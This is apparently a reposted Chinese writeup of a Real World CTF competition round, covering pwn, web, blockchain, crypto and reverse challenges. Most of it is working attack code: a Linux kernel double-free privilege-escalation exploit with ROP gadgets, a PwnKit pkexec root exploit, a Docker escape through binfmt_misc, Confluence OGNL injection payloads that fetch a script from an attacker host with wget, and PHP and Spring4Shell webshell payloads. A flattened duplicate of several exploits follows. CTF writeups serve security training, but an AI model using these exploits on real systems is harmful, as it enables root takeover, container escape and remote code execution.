# 第五届 Real World CTF 体验赛  Writeup

> 原文: https://www.ctfiot.com/91583.html
> ID: 91583

别忘了

星标我！

以下为本次体验赛所有题目的Writeup。

Pwn

Digging into Kernel 3

题目在5.19.0版本的Linux Kernel上运行了一个有漏洞的驱动，驱动代码比较简单，包括uaf，race condition，memory leak等多个漏洞。通过漏洞驱动获取root权限有很多种方法，这里贴出作者old-school的exploit代码（并非最简单的方法，甚至相对复杂，使用USMA/DirtyCred等手段可以写出更简洁更稳定的exploit）

#define _GNU_SOURCE#include <sched.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include #include <ctype.h>#include <err.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <sys/timerfd.h>#include <sys/ioctl.h>#include <sys/syscall.h>#include <linux/keyctl.h>
// user_key_payload#define size_user_key_payload (24)// (gdb) ptype /o struct user_key_payload// /* offset | size */ type = struct user_key_payload {// /* 0 | 16 */ struct callback_head {// /* 0 | 8 */ struct callback_head *next;// /* 8 | 8 */ void (*func)(struct callback_head *);// // /* total size (bytes): 16 */// } rcu;// /* 16 | 2 */ unsigned short datalen;// /* XXX 6-byte hole */// /* 24 | 0 */ char data[];// // /* total size (bytes): 24 */// }
int key_alloc(char *description, char *payload, int payload_len) { return syscall( __NR_add_key, "user", description, payload, payload_len, KEY_SPEC_PROCESS_KEYRING );}
void key_spray(int *keys, int spray_count, char *payload, int payload_len, char *description, int description_len) { char *tmp_desc = (char *)malloc(description_len + 100); memset(tmp_desc, 0, description_len + 100); memcpy(tmp_desc, description, description_len); for(int i = 0; i < spray_count; i++) { snprintf(tmp_desc + description_len, 100, "_%d", i); keys[i] = key_alloc(tmp_desc, payload, payload_len); if(keys[i] == -1) { perror("add_key"); printf("failed index: %dn", i); // break; exit(-1); } } free(tmp_desc);}
int key_revoke(int key_id) { return syscall( __NR_keyctl, KEYCTL_REVOKE, key_id, 0, 0, 0 );}
int key_free(int key_id) { return syscall( __NR_keyctl, KEYCTL_UNLINK, key_id, KEY_SPEC_PROCESS_KEYRING );}

int key_read(int key_id, char *retbuf, int retbuf_len) { return syscall( __NR_keyctl, KEYCTL_READ, key_id, retbuf, retbuf_len );}// user_key_payload

// utilsvoid breakpoint() { printf("press enter to continue...n"); getchar();}
#ifndef HEXDUMP_COLS#define HEXDUMP_COLS 16#endif
void hexdump(void *mem, unsigned int len) { putchar('n'); for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) { /* print offset */ if(i % HEXDUMP_COLS == 0) { printf("0x%06x: ", i); }
 /* print hex data */ if(i < len) { printf("%02x ", 0xFF & ((char*)mem)[i]); } /* end of block, just aligning for ASCII dump */ else { printf(" "); }
 /* print ASCII dump */ if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) { for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) { /* end of block, not really printing */ if(j >= len) { putchar(' '); } /* printable char */ else if(isprint(((char*)mem)[j])) { putchar(0xFF & ((char*)mem)[j]); } /* other char */ else { putchar('.'); } } putchar('n'); } } putchar('n');}// utils
// here we startstruct add_param { int idx; int size; char *cont;};
int g_fd;
int seq_fd;
unsigned long long g_vmlinux = 0;
unsigned long long g_modprobe_path = 0;
unsigned long long g_do_task_dead = 0;
unsigned long long g_heap = 0;
unsigned long long pop_rax_ret = 0;
unsigned long long pop_rcx_ret = 0;
unsigned long long pop_rdi_ret = 0;
unsigned long long mov_ptr_rax_rdi_ret = 0;
unsigned long long ret = 0;

void setup() { g_fd = open("/dev/rwctf", O_RDWR); printf("g_fd = %dn", g_fd);
 system("echo '#!/bin/shnchmod 777 /flag' > /tmp/x"); system("chmod +x /tmp/x");
 system("echo -ne '\xff\xff\xff\xff' > /tmp/dummy"); system("chmod +x /tmp/dummy");
 if(fork()) { sleep(3); system("/tmp/dummy 2>/dev/null"); system("ls -l /flag"); system("cat /flag"); exit(1); }}
void add(int idx, int size, char* cont) { struct add_param arg = { .idx = idx, .size = size, .cont = cont, };
 ioctl(g_fd, 0xdeadbeef, &arg); // no error check}
void delete(int idx) { ioctl(g_fd, 0xc0decafe, &idx); // no error check}
void leak() { int OBJ_SIZE = 0x100; char *cont = malloc(OBJ_SIZE); memset(cont, 'x', OBJ_SIZE);
 add(0, OBJ_SIZE, cont); delete(0); // first free
 int SPRAY_USER_KEY_SIZE = OBJ_SIZE - size_user_key_payload; int SPARY_USER_KEY_CNT = 50; int *keys = malloc(SPARY_USER_KEY_CNT * sizeof(int)); char *user_key_payload = malloc(SPRAY_USER_KEY_SIZE); memset(user_key_payload, 'y', SPRAY_USER_KEY_SIZE); key_spray(keys, SPARY_USER_KEY_CNT, user_key_payload, SPRAY_USER_KEY_SIZE, "spray_key", strlen("spray_key"));
 delete(0); // double free
 *(unsigned long long *)&cont[0x0] = 0; *(unsigned long long *)&cont[0x8] = 0; *(unsigned long long *)&cont[0x10] = 0x2000; // user_key size for(int i = 0; i < 100; i++) { add(1, OBJ_SIZE, cont); }
 char *recv_payload = malloc(0x2000); int anchor = 0; for(int i = 0; i < SPARY_USER_KEY_CNT; i++) { memset(recv_payload, 0, 0x2000); int retval = key_read(keys[i], recv_payload, 0x2000); // printf("retval = %dn", retval); if(retval > SPRAY_USER_KEY_SIZE) { printf("find anchor %dn", anchor); printf("we leaked something...n"); anchor = i; break; } }
 if(anchor == 0) { err(-1, "bad luck, try again!n"); }
 for(int i = 0; i < SPARY_USER_KEY_CNT; i++) { if(i != anchor) { key_revoke(keys[i]); } }
 memset(recv_payload, 0, 0x2000); int retval = key_read(keys[anchor], recv_payload, 0x2000); // printf("retval = %dn", retval); if(retval > SPRAY_USER_KEY_SIZE) { // hexdump(recv_payload, 0x200); unsigned long long heap = *(unsigned long long *)&recv_payload[0xe8]; unsigned long long _user_free_payload_rcu = *(unsigned long long *)&recv_payload[0xf0]; unsigned long long needle = *(unsigned long long *)&recv_payload[0x100]; if(needle == 0x7979797979797979 && heap && _user_free_payload_rcu) { printf("leaked heap @ 0x%llxn", heap); printf("leaked user_free_payload_rcu @ 0x%llxn", _user_free_payload_rcu); g_vmlinux = _user_free_payload_rcu - 0x339d8210; printf("vmlinux @ 0x%llxn", g_vmlinux); g_modprobe_path = g_vmlinux + 0x34e510a0; // printf("modprobe_path @ 0x%llxn", g_modprobe_path); g_do_task_dead = g_vmlinux + 0x336a3190; pop_rax_ret = g_vmlinux + 0x33600ddb; // pop rax; ret pop_rcx_ret = g_vmlinux + 0x33662de3; // pop rcx; ret pop_rdi_ret = g_vmlinux + 0x3366ab4d; // pop rdi; ret mov_ptr_rax_rdi_ret = g_vmlinux + 0x337b614a; // mov qword ptr [rax], rdi; ret ret = g_vmlinux + 0x33600341; // ret } }
 sleep(1); // free user_key for(int i = 0; i < 100; i++) { close(keys[i]); }
 // // place gadgets // memset(cont, '!', OBJ_SIZE); // for(int i = 0; i < 100; i++) { // add(1, OBJ_SIZE, cont); // }}
void hijack() { int OBJ_SIZE = 0x20; // char *cont = malloc(OBJ_SIZE); memset(cont, 'z', OBJ_SIZE);
 add(0, OBJ_SIZE, cont); delete(0); // first free
 seq_fd = open("/proc/self/stat", O_RDONLY); delete(0); // second free

 unsigned char fake_seq_operations[OBJ_SIZE]; memset(fake_seq_operations, '0', OBJ_SIZE); // *(unsigned long long *)&fake_seq_operations[0x00] = 0x1111111111111111; *(unsigned long long *)&fake_seq_operations[0x00] = g_vmlinux + 0x3388f732; // ret 0x160 *(unsigned long long *)&fake_seq_operations[0x08] = ret; *(unsigned long long *)&fake_seq_operations[0x10] = ret; *(unsigned long long *)&fake_seq_operations[0x18] = pop_rax_ret;
 for(int i = 0; i < 1; i++) { add(1, OBJ_SIZE, fake_seq_operations); }
 __asm__( "mov r15, pop_rax_ret;" "mov r14, g_modprobe_path;" "mov r13, pop_rdi_ret;" "mov r12, 0x0000782f706d742f;" // /tmp/xx00 "mov rbp, mov_ptr_rax_rdi_ret;" "mov rbx, g_do_task_dead;" "mov r11, 0x77777777;" "mov r10, 0x88888888;" "mov r9, 0x99999999;" "mov r8, 0xaaaaaaaa;" "mov rcx, 0x666666;" "mov rdx, 8;" "mov rsi, rsp;" "mov rdi, seq_fd;" "xor rax, rax;" "syscall" ); // read(seq_fd, fake_seq_operations, 1);

}
int main() { setup(); leak();
 // breakpoint(); hijack();
 // breakpoint();
 return 0;}

Be-a-PK-LPE-Master

#include <stdio.h>#include <stdlib.h>#include 
char *shell = "#include <stdio.h>n" "#include <stdlib.h>n" "#include nn" "void gconv() {}n" "void gconv_init() {n" " setuid(0); setgid(0);n" " seteuid(0); setegid(0);n" " system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");n" " exit(0);n" "}";
int main(int argc, char *argv[]) { FILE *fp; system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'"); system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules"); fp = fopen("pwnkit/pwnkit.c", "w"); fprintf(fp, "%s", shell); fclose(fp); system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC"); char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL }; execve("/usr/bin/pkexec", (char*[]){NULL}, env);}

Be-a-Docker-Escaper-2

其 binfmt 的格式如下：

name:
type:
offset:
magic:
mask:
interpreter:
flags

这个配置中每个字段都用冒号 : 分割，某些字段拥有默认值可以跳过，但是必须保留相应的冒号分割符。

各个字段的意义如下：

name：规则名

因此我们可以注册一个自己的 binfmt， 然后让其 HOST 执行相应的文件，就可以完成逃逸。关键是如何在 HOST 执行相应的文件。观察出题人给的条件,  出题人给了 ssh 登陆的途径。

我们通过 strace sshd 进程 ，会发现 sshd 服务当有 ssh 尝试连接的时候会执行一些 bash 脚本，例如 etc/update-motd.d/00-header

至此打通了逃逸的路径

1、首先注册一个自己的 binfmt

echo ":
test:M::
x23x21x2fx62x69x6ex2fx73x68::/var/lib/docker/overlay2/$overlay/diff/tmp/exploit:" > /binfmt_misc/register

2、往 /var/lib/docker/overlay2/$overlay/diff/tmp/exploit 写入我们要执行的命令

echo '#!/bin/bash' > /tmp/exploitecho "docker cp /root/flag $container:/tmp/" >> /tmp/exploitchmod 777 /tmp/exploit

Be-a-Docker-Escaper-3

该利用使用 ptrace 方式来实现对 vDSO 内存的修改触发 COW，但是新版本 docker 默认禁止 ptrace。

该利用对 vDSO 的 patch 选择的位置在 ubuntu 的内核里触发不了，需要换一个 patch 点。

pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyelftoolsgit clone https://github.com/zh-explorer/dirtycow.gitcd dirtycowmkdir buildcd buildcmake ..make./dirtycow {IP} 31337

Be-a-BUS-Driver

busctl --system call org.dbus.rwctf /org/dbus/rwctf org.dbus.rwctf1 SayBoss s "/tmp/exp.sh"

Web

Be-a-Wiki-Hacker

GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: example.com:
8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close

${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}

如果要拿服务器 shell 权限，可以反弹 shell，这里注意 Java 里 Runtime 直接传递字符串执行 exec 的话，命令里不支持 shell 语法特性（比如管道符、重定向等），以及这里由于 tomcat 处理 url 的安全特性，url 里不能出现编码后的斜线，所以可以执行最简单的，wget 从远程拉一个脚本下来然后执行，分三次执行：

${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("wget script.attacker.com").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}

${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("chmod +x index.html").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}

${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("bash index.html").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}

Evil MySQL Server

ApacheCommandText

${base64decoder:
JHtzY3JpcHQ6SmF2YVNjcmlwdDp2YXIgYT1qYXZhLmxhbmcuUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygiL3JlYWRmbGFnIik7dmFyIGI9YS5nZXRJbnB1dFN0cmVhbSgpO3ZhciBjPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKG5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKGIpKTtjLnJlYWRMaW5lKCk7fQ==}

Be-a-Langurage-Expert

GET /?+config-create+/&lang=../../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval($_POST[a]);?>+/tmp/1.php HTTP/1.1Host: localhost:
8888Accept-Encoding: gzip, deflateAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36Connection: closeCache-Control: max-age=0

此时在 /tmp/1.php 中的内容就是 <?=@eval($_POST[a]);?>。我们之后只需要使用Webshell 管理工具连接如下地址即可。

http://your-ip:
8888/?&lang=../../../../../../../../../../../tmp/1

最后执行 /readflag 获取 Flag

Yummy Api

使用 Mongodb 注入拿到用户项目的 Token ，这一步需要爆破。

在默认情况下利用这个使用 aes192 加密 token，这样我们可以调用项目的任意功能,。

然后通过调用项目的 pre-script 功能，上传 vm2 的逃逸脚本实现 RCE。

py -3 .poc.py --debug one4all -u http://ip:
9090/ -c "/readflag"

Spring4Shell

$ python git_extract.py http://47.98.216.107:
31584/.git/

$ cat 47.98.216.107_31584/server.xml|grep appBase<Host name="XXXX" appBase="chaitin"

Spring4shell EXP：

可使用:
https://github.com/reznok/Spring4Shell-POC.需要手动指定 web 路径

python exploit.py --url http://47.98.216.107:
31584/ --dir chaitin/ROOT

解题思路二：

修改 appBase，不需要获取 web 路径，此 payload 不常见，github 上检索不到。

payload：class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=/tmp&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&class.module.classLoader.resources.context.parent.appBase=/

webshell 写入路径：/tmp/shell.jsp

访问 webshell：

http://47.98.216.107:
31584/tmp/shell.jsp?cmd=id

读取 flag

Misc

Long Range

通过题目描述 Long Range与频段 500.5Mhz (属于 LoRa 在中国常用的CN470-510频段) 结合猜测信号中是一段 LoRa 信号。 使用 SDRSharp 或其他工具加载 wav 文件，可以发现信号也比较符合 LoRa 的特征，进一步印证猜测并分析出所使用的带宽为125kHz。

Be-a-Famicom-Hacker

使用模拟器打开游戏，可以发现界面的 komani 1988被修改为了 RWCTF 2023，知晓 ROM 被修改。

最硬核的解题方式是通过 ROM 大小知道是日版的魂斗罗，然后下载原版 ROM diff 修改内容，然后逆向 ROM 代码，但游戏类题目一般只要探索过所有场景即可获得 flag。

通过搜索可以知道，魂斗罗存在一个隐藏彩蛋：在过关的结尾动画（包括滚动名单）期间，全程按住 Select+Start 键，即可见到一段隐藏的彩蛋，flag 就放在隐藏彩蛋中。

关于快速通关，

BlockChain

HappyFactory

解题 Exploit 如下:

pragma solidity ^0.8.0;import "./Happy.sol";
contract Exploit { event tokenA_tokenB(address, address); IHappyFactory factory = IHappyFactory(address(0xA2A21Fe2fD692b63Df06ECd5b0a783323B4eae36)); IHappyPair public pair; IHappyERC20 public tokenA; IHappyERC20 public tokenB; address public gamer;
 constructor(address tokenA_address, address tokenB_address) { gamer = msg.sender; tokenA = IHappyERC20(tokenA_address); tokenB = IHappyERC20(tokenB_address); pair = IHappyPair(factory.getPair(tokenA_address, tokenB_address)); }
 function attack(uint256 amount0, uint256 amount1) public { pair.swap(amount0, amount1, address(this), "0x"); tokenB.transfer(gamer, 1 ether); }
 fallback() external { pair.sync(); tokenA.transferFrom(gamer, address(pair), 1 ether); }}

Crypto

babyCurve

这时候就可以利用同构求出密钥x，然后一切问题都迎刃而解

下面提供下 exp

from Crypto.Util.number import *from Crypto.Cipher import AESp = 193387944202565886198256260591909756041P.<x> = GF(p)[]f = x^3 + 2*x^2 + xP = (4, 10)Q = (65639504587209705872811542111125696405,125330437930804525313353306745824609665)f_ = f.subs(x=x-1)print f_.factor()
P_ = (P[0] +1, P[1])Q_ = (Q[0] +1, Q[1])
t = GF(p)(p-1).square_root()u = (P_[1] + t*P_[0])/(P_[1] - t*P_[0]) % pv = (Q_[1] + t*Q_[0])/(Q_[1] - t*Q_[0]) % pprint(v.log(u))k = v.log(u)aes = AES.new(long_to_bytes(k).ljust(16, ' '), AES.MODE_CBC, ' '*16)flag = "b3669dc657cef9dc17db4de5287cd1a1e8a48184ed9746f4c52d3b9f8186ec046d6fb1b8ed1b45111c35b546204b68e0".decode("hex")print(len(flag))plaintext = aes.decrypt(flag)print(plaintext)

Reverse

SNAKE

比较容易猜到是 brainfuck，但是有点小改动，不能直接在线解密，仔细分析的话可以发现是[]<>互换了一下，图方便可以 hook 拿到返回值

function hook(){ Java.perform(function(){ var SecurityParams = Java.use("b.a.a.a"); SecurityParams.a.implementation = function(str){ var ret = this.a(str); console.log(ret); return ret; } }); }function main() { hook()}
setImmediate(main)

数组中的元素即对应 drawable 目录中 flag 文件名，按顺序找出对应图片即可得到 flag，需要注意的是 this.v 在i函数中会先自增一次，所以 flag 从第1个元素开始取

Check-In

?了拼?

直接拼图就可以获取 flag

点分享

点收藏

点点赞

点在看


```
    #define _GNU_SOURCE#include <sched.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include #include <ctype.h>#include <err.h>#include <sys/types.h>#include <sys/stat.h>#include <fcntl.h>#include <sys/timerfd.h>#include <sys/ioctl.h>#include <sys/syscall.h>#include <linux/keyctl.h>
// user_key_payload#define size_user_key_payload (24)// (gdb) ptype /o struct user_key_payload// /* offset | size */ type = struct user_key_payload {// /* 0 | 16 */ struct callback_head {// /* 0 | 8 */ struct callback_head *next;// /* 8 | 8 */ void (*func)(struct callback_head *);// // /* total size (bytes): 16 */// } rcu;// /* 16 | 2 */ unsigned short datalen;// /* XXX 6-byte hole */// /* 24 | 0 */ char data[];// // /* total size (bytes): 24 */// }
int key_alloc(char *description, char *payload, int payload_len) { return syscall( __NR_add_key, "user", description, payload, payload_len, KEY_SPEC_PROCESS_KEYRING );}
void key_spray(int *keys, int spray_count, char *payload, int payload_len, char *description, int description_len) { char *tmp_desc = (char *)malloc(description_len + 100); memset(tmp_desc, 0, description_len + 100); memcpy(tmp_desc, description, description_len); for(int i = 0; i < spray_count; i++) { snprintf(tmp_desc + description_len, 100, "_%d", i); keys[i] = key_alloc(tmp_desc, payload, payload_len); if(keys[i] == -1) { perror("add_key"); printf("failed index: %dn", i); // break; exit(-1); } } free(tmp_desc);}
int key_revoke(int key_id) { return syscall( __NR_keyctl, KEYCTL_REVOKE, key_id, 0, 0, 0 );}
int key_free(int key_id) { return syscall( __NR_keyctl, KEYCTL_UNLINK, key_id, KEY_SPEC_PROCESS_KEYRING );}

int key_read(int key_id, char *retbuf, int retbuf_len) { return syscall( __NR_keyctl, KEYCTL_READ, key_id, retbuf, retbuf_len );}// user_key_payload

// utilsvoid breakpoint() { printf("press enter to continue...n"); getchar();}
    #ifndef HEXDUMP_COLS#define HEXDUMP_COLS 16#endif
void hexdump(void *mem, unsigned int len) { putchar('n'); for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) { /* print offset */ if(i % HEXDUMP_COLS == 0) { printf("0x%06x: ", i); }
 /* print hex data */ if(i < len) { printf("%02x ", 0xFF & ((char*)mem)[i]); } /* end of block, just aligning for ASCII dump */ else { printf(" "); }
 /* print ASCII dump */ if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) { for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) { /* end of block, not really printing */ if(j >= len) { putchar(' '); } /* printable char */ else if(isprint(((char*)mem)[j])) { putchar(0xFF & ((char*)mem)[j]); } /* other char */ else { putchar('.'); } } putchar('n'); } } putchar('n');}// utils
// here we startstruct add_param { int idx; int size; char *cont;};
int g_fd;
int seq_fd;
unsigned long long g_vmlinux = 0;
unsigned long long g_modprobe_path = 0;
unsigned long long g_do_task_dead = 0;
unsigned long long g_heap = 0;
unsigned long long pop_rax_ret = 0;
unsigned long long pop_rcx_ret = 0;
unsigned long long pop_rdi_ret = 0;
unsigned long long mov_ptr_rax_rdi_ret = 0;
unsigned long long ret = 0;

void setup() { g_fd = open("/dev/rwctf", O_RDWR); printf("g_fd = %dn", g_fd);
 system("echo '#!/bin/shnchmod 777 /flag' > /tmp/x"); system("chmod +x /tmp/x");
 system("echo -ne '\xff\xff\xff\xff' > /tmp/dummy"); system("chmod +x /tmp/dummy");
 if(fork()) { sleep(3); system("/tmp/dummy 2>/dev/null"); system("ls -l /flag"); system("cat /flag"); exit(1); }}
void add(int idx, int size, char* cont) { struct add_param arg = { .idx = idx, .size = size, .cont = cont, };
 ioctl(g_fd, 0xdeadbeef, &arg); // no error check}
void delete(int idx) { ioctl(g_fd, 0xc0decafe, &idx); // no error check}
void leak() { int OBJ_SIZE = 0x100; char *cont = malloc(OBJ_SIZE); memset(cont, 'x', OBJ_SIZE);
 add(0, OBJ_SIZE, cont); delete(0); // first free
 int SPRAY_USER_KEY_SIZE = OBJ_SIZE - size_user_key_payload; int SPARY_USER_KEY_CNT = 50; int *keys = malloc(SPARY_USER_KEY_CNT * sizeof(int)); char *user_key_payload = malloc(SPRAY_USER_KEY_SIZE); memset(user_key_payload, 'y', SPRAY_USER_KEY_SIZE); key_spray(keys, SPARY_USER_KEY_CNT, user_key_payload, SPRAY_USER_KEY_SIZE, "spray_key", strlen("spray_key"));
 delete(0); // double free
 *(unsigned long long *)&cont[0x0] = 0; *(unsigned long long *)&cont[0x8] = 0; *(unsigned long long *)&cont[0x10] = 0x2000; // user_key size for(int i = 0; i < 100; i++) { add(1, OBJ_SIZE, cont); }
 char *recv_payload = malloc(0x2000); int anchor = 0; for(int i = 0; i < SPARY_USER_KEY_CNT; i++) { memset(recv_payload, 0, 0x2000); int retval = key_read(keys[i], recv_payload, 0x2000); // printf("retval = %dn", retval); if(retval > SPRAY_USER_KEY_SIZE) { printf("find anchor %dn", anchor); printf("we leaked something...n"); anchor = i; break; } }
 if(anchor == 0) { err(-1, "bad luck, try again!n"); }
 for(int i = 0; i < SPARY_USER_KEY_CNT; i++) { if(i != anchor) { key_revoke(keys[i]); } }
 memset(recv_payload, 0, 0x2000); int retval = key_read(keys[anchor], recv_payload, 0x2000); // printf("retval = %dn", retval); if(retval > SPRAY_USER_KEY_SIZE) { // hexdump(recv_payload, 0x200); unsigned long long heap = *(unsigned long long *)&recv_payload[0xe8]; unsigned long long _user_free_payload_rcu = *(unsigned long long *)&recv_payload[0xf0]; unsigned long long needle = *(unsigned long long *)&recv_payload[0x100]; if(needle == 0x7979797979797979 && heap && _user_free_payload_rcu) { printf("leaked heap @ 0x%llxn", heap); printf("leaked user_free_payload_rcu @ 0x%llxn", _user_free_payload_rcu); g_vmlinux = _user_free_payload_rcu - 0x339d8210; printf("vmlinux @ 0x%llxn", g_vmlinux); g_modprobe_path = g_vmlinux + 0x34e510a0; // printf("modprobe_path @ 0x%llxn", g_modprobe_path); g_do_task_dead = g_vmlinux + 0x336a3190; pop_rax_ret = g_vmlinux + 0x33600ddb; // pop rax; ret pop_rcx_ret = g_vmlinux + 0x33662de3; // pop rcx; ret pop_rdi_ret = g_vmlinux + 0x3366ab4d; // pop rdi; ret mov_ptr_rax_rdi_ret = g_vmlinux + 0x337b614a; // mov qword ptr [rax], rdi; ret ret = g_vmlinux + 0x33600341; // ret } }
 sleep(1); // free user_key for(int i = 0; i < 100; i++) { close(keys[i]); }
 // // place gadgets // memset(cont, '!', OBJ_SIZE); // for(int i = 0; i < 100; i++) { // add(1, OBJ_SIZE, cont); // }}
void hijack() { int OBJ_SIZE = 0x20; // char *cont = malloc(OBJ_SIZE); memset(cont, 'z', OBJ_SIZE);
 add(0, OBJ_SIZE, cont); delete(0); // first free
 seq_fd = open("/proc/self/stat", O_RDONLY); delete(0); // second free

 unsigned char fake_seq_operations[OBJ_SIZE]; memset(fake_seq_operations, '0', OBJ_SIZE); // *(unsigned long long *)&fake_seq_operations[0x00] = 0x1111111111111111; *(unsigned long long *)&fake_seq_operations[0x00] = g_vmlinux + 0x3388f732; // ret 0x160 *(unsigned long long *)&fake_seq_operations[0x08] = ret; *(unsigned long long *)&fake_seq_operations[0x10] = ret; *(unsigned long long *)&fake_seq_operations[0x18] = pop_rax_ret;
 for(int i = 0; i < 1; i++) { add(1, OBJ_SIZE, fake_seq_operations); }
 __asm__( "mov r15, pop_rax_ret;" "mov r14, g_modprobe_path;" "mov r13, pop_rdi_ret;" "mov r12, 0x0000782f706d742f;" // /tmp/xx00 "mov rbp, mov_ptr_rax_rdi_ret;" "mov rbx, g_do_task_dead;" "mov r11, 0x77777777;" "mov r10, 0x88888888;" "mov r9, 0x99999999;" "mov r8, 0xaaaaaaaa;" "mov rcx, 0x666666;" "mov rdx, 8;" "mov rsi, rsp;" "mov rdi, seq_fd;" "xor rax, rax;" "syscall" ); // read(seq_fd, fake_seq_operations, 1);

}
int main() { setup(); leak();
 // breakpoint(); hijack();
 // breakpoint();
 return 0;}
    #include <stdio.h>#include <stdlib.h>#include 
char *shell = "#include <stdio.h>n" "#include <stdlib.h>n" "#include nn" "void gconv() {}n" "void gconv_init() {n" " setuid(0); setgid(0);n" " seteuid(0); setegid(0);n" " system("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh");n" " exit(0);n" "}";
int main(int argc, char *argv[]) { FILE *fp; system("mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'"); system("mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules"); fp = fopen("pwnkit/pwnkit.c", "w"); fprintf(fp, "%s", shell); fclose(fp); system("gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC"); char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL }; execve("/usr/bin/pkexec", (char*[]){NULL}, env);}
name:
type:
offset:
magic:
mask:
interpreter:
flags
echo ":
test:M::
x23x21x2fx62x69x6ex2fx73x68::/var/lib/docker/overlay2/$overlay/diff/tmp/exploit:" > /binfmt_misc/register
echo '#!/bin/bash' > /tmp/exploitecho "docker cp /root/flag $container:/tmp/" >> /tmp/exploitchmod 777 /tmp/exploit
pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyelftoolsgit clone https://github.com/zh-explorer/dirtycow.gitcd dirtycowmkdir buildcd buildcmake ..make./dirtycow {IP} 31337
busctl --system call org.dbus.rwctf /org/dbus/rwctf org.dbus.rwctf1 SayBoss s "/tmp/exp.sh"
GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/ HTTP/1.1Host: example.com:
8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("wget script.attacker.com").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
